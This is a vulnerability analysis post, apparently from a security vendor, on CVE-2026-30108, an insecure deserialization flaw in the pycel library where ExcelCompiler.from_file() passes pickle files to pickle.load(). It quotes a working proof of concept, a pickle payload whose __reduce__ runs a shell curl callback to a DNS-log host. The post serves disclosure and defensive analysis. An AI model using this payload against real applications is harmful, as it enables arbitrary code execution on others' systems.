---
title: "CVE-2026-30108 Analysis: Insecure Deserialization in Pycel via `from_file()`"
description: "Technical analysis of CVE-2026-30108 in pycel <= 1.0b30, where `ExcelCompiler.from_file()` routes pickle-backed input into `pickle.load()`, leading to verified arbitrary code execution during deserialization."
keywords: "CVE-2026-30108, pycel vulnerability, insecure deserialization, pickle.load, arbitrary code execution, Python security, ZAST.AI, vulnerability research"
date: 2026-04-21
categories: ["Vulnerability Research", "AI Security"]
tags:
  [
    "CVE-2026-30108",
    "pycel",
    "Insecure Deserialization",
    "Python Security",
    "ZAST.AI"
  ]
author: ZAST Team
image: assets/img/logo-single.png
excerpt: "ZAST.AI verified CVE-2026-30108 in pycel <= 1.0b30. The issue is not just the presence of `pickle.load()`, but that `ExcelCompiler.from_file()` can deserialize attacker-controlled input and execute payloads before later validation fails."
---


> | Field | Value |
> |---|---|
> | Target Project | pycel |
> | CVE ID(s) | CVE-2026-30108 |
> | Max Severity | Severity Pending Publication |
> | Vulnerability Type | Insecure Deserialization / Arbitrary Code Execution |
> | Discovery Engine | ZAST.AI |

A reserved CVE ID, **CVE-2026-30108**, has been assigned to an insecure deserialization issue in **pycel <= 1.0b30**, a Python library for compiling Excel spreadsheets into Python code and graph structures. As of **April 20, 2026**, the public GitHub repository showed **618 stars**, and PyPI still listed **1.0b30** as the latest release, published on **October 13, 2021**.

The root cause is simple, but the impact is arbitrary code execution. `ExcelCompiler.from_file()` loads attacker-controlled pickle content with `pickle.load()`. If an application passes an untrusted compiled file into this path, code execution happens during deserialization, before pycel has a chance to validate the resulting object.

That is exactly the kind of issue that exposes a structural blind spot in traditional static analysis. The dangerous API is easy to spot. The harder question is whether the full feature path makes the sink reachable with attacker-controlled serialized data, and whether execution can be proven before later validation fails. That requires reasoning about file type selection, execution order, and the actual effect of the loaded object. The PoC shows that this path is not theoretical. More importantly, it shows why verification matters more than sink inventory alone.

## The Vulnerable Load Path

The vulnerable logic is in `src/pycel/excelcompiler.py`:

```python
@classmethod
def from_file(cls, filename, plugins=None):
    """ Load the spreadsheet saved by `to_file`
    :param filename: filename to load from, can be xlsx_name
    :param plugins: module paths for plugin lib functions
    """

    extension = cls._filename_has_extension(filename) or next(
        (ext for ext in cls.save_file_extensions
         if os.path.exists(filename + '.' + ext)), None)

    if not extension:
        raise ValueError(f"Unrecognized file type or compiled file not found: '{filename}'")

    if not filename.endswith(extension):
        filename += '.' + extension

    if extension[0] == 'p':
        with open(filename, 'rb') as f:
            excel_compiler = pickle.load(f)
    else:
        excel_compiler = cls._from_text(
            filename, is_json=extension == 'json')
```

The key branch is straightforward:

- infer or append the file extension
- if the extension starts with `p`
- open the file in binary mode
- pass it directly to `pickle.load()`

No signature check. No trust boundary. No constrained unpickler. No validation before object construction.

The helper that determines whether the filename already carries a supported extension is minimal:

```python
@classmethod
def _filename_has_extension(cls, filename):
    return next((extension for extension in cls.save_file_extensions
                 if filename.endswith(extension)), None)
```

That means the security property of `from_file()` depends entirely on whether the caller guarantees the file is trusted. pycel itself does not enforce that boundary.

## PoC Verification

The issue report includes a compact PoC:

```python
import pickle
import tempfile

class MaliciousPayload:
    def __reduce__(self):
        import subprocess
        return (subprocess.Popen, (["/bin/sh", "-c", "curl http://example.dns.log.es"],))

malicious_payload = pickle.dumps(MaliciousPayload())

with tempfile.NamedTemporaryFile(mode='wb', suffix='.pkl', delete=False) as tmp_file:
    tmp_file.write(malicious_payload)
    tmp_file_path = tmp_file.name

from pycel import ExcelCompiler
result = ExcelCompiler.from_file(tmp_file_path)
```

The observed output is important:

```text
[FAIL] Error loading payload: 'Popen' object has no attribute 'filename'
```

![PoC screenshot showing the traceback and DNS callback confirming execution before failure]({{ "/assets/img/30108.gif" | relative_url }})


*PoC validation screenshot: the left side shows the payload and the post-execution traceback, while the right side shows the DNS interaction confirming that execution already happened before `pycel` rejected the object.*

That exception happens **after** deserialization has already executed the payload. The accompanying DNS-log callback confirms that the command ran before pycel later failed on object shape assumptions.

This is a useful detail because it shows why insecure deserialization is often underestimated in casual review. A downstream exception does not make the sink safe. By the time the program rejects the object, attacker-controlled code has already executed. That execution order is the key verification result in this case.

## The Real Exploit Condition

This is not “unauthenticated network RCE” by itself. The exploit condition is narrower and more realistic:

- an application uses pycel
- it calls `ExcelCompiler.from_file()`
- the file path or file contents are attacker-controlled or attacker-replaceable
- the loaded file is a pickle-backed compiled spreadsheet artifact

If those conditions hold, arbitrary code execution is immediate.

In practice, this is more likely to appear in trusted-file ingestion, local execution, or supply-chain-style scenarios than as a direct internet-facing endpoint bug.

That distinction matters for remediation and for severity triage. The core bug is still **in pycel**, because the library exposes a deserialization path that assumes trust without enforcing it. But exploitability in a real environment depends on whether an application lets untrusted users supply or influence compiled pycel files.

## Why Traditional SAST Often Misses the Important Part

A pattern-based SAST engine can usually flag `pickle.load()`. That detection is straightforward, but it is only the first step.

The harder part is answering the questions that determine whether the finding is actionable:

- Is the dangerous branch actually reachable through a supported feature path?
- Does extension selection route attacker-controlled input into the pickle loader?
- Does code execution happen before object validation?
- Is the failure mode “harmless exception,” or “code runs and then an exception is raised”?

This is where semantic analysis and verification matter more than raw sink matching. The issue is not just that `pickle.load()` exists. The issue is that `from_file()` treats a serialized artifact as trusted executable object state, and the PoC demonstrates that the payload executes before the library can reject the result. In other words, the important output is not a generic deserialization warning. It is a verified execution path.

## Conclusion

**CVE-2026-30108** is a concise example of why security analysis has to go beyond dangerous API inventories. `pickle.load()` is well known. What matters is whether a real feature path allows attacker-controlled data to reach it, and whether the sink is exploitable before later checks fail.

In pycel, that answer is yes. The deserialization path executes attacker-controlled behavior first and only breaks afterward.

That is the difference between guessing that a code pattern is risky and proving that the path is exploitable. Traditional SAST can flag the sink. A verification-driven workflow closes the loop by establishing that the execution path is real.

**Sources**
- Vulnerability report / issue: [pycel issue #166](https://github.com/dgorissen/pycel/issues/166)
- Project homepage: [pycel on GitHub](https://github.com/dgorissen/pycel)
- Package page: [pycel on PyPI](https://pypi.org/project/pycel/)
